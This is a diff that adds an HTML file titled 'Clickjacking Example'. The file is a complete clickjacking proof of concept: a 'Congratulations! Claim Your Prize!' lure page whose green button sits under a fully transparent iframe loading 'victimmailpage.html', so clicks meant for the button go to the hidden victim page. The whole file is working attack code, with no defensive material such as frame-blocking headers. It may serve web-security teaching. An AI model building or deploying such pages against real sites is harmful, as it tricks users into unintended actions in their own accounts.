@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Clickjacking Example</title>
+    <style>
+        /* Style for the button container */
+        .button-container {
+            position: relative;
+            width: 200px;
+            height: 50px;
+        }
+         
+        /* Style for the "Claim Your Prize" button */
+        #prizeButton {
+            width: 200px;
+            height: 50px;
+            font-size: 18px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            z-index: 1; /* Button under iframe */
+        }
+
+        /* Style for the invisible iframe (placed above button) */
+        #invisibleFrame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 200px;  /* same as button */
+            height: 50px;  /* same as button */
+            opacity: 0;    /* invisible but clickable */
+            z-index: 2;    /* above the button */
+        }
+    </style>
+</head>
+<body>
+    <h1>Congratulations! Claim Your Prize!</h1>
+
+    <div class="button-container">
+        <button id="prizeButton">Claim Your Prize</button>
+        <iframe id="invisibleFrame" src="victimmailpage.html" frameborder="0"></iframe>
+    </div>
+</body>
+</html>
